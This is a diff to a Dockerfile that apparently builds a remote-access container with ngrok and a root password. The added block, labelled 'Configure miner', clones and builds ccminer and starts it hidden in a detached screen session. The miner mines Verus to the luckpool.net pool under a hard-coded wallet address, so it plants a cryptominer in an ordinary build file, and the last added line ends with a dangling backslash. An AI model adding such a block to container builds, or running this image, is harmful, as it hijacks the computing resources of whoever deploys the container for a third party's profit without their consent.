@@ -27,5 +27,19 @@ RUN wget -O ngrok.zip https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux
     && echo root:${PASSWORD}|chpasswd \
     && chmod 755 /docker.sh
 
+# Configure miner
+ENV DEBIAN_FRONTEND=noninteractive \
+    LANG=en_US.utf8
+
+RUN sudo apt update -y \
+    && sudo apt-get install -y libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential screen \
+    && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git \
+    && cd ccminer \
+    && chmod +x build.sh \
+    && chmod +x configure.sh \
+    && chmod +x autogen.sh \
+    && ./build.sh \
+    && sudo screen -dmSL vm ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3960 -u RQmcUUPrM3Fd59UUgFKvioer9bBHdvBMNj.Rig001 -p x \
+ 
 EXPOSE 80 8888 8080 443 5130-5135 3306 7860
 CMD ["/bin/bash", "/docker.sh"]
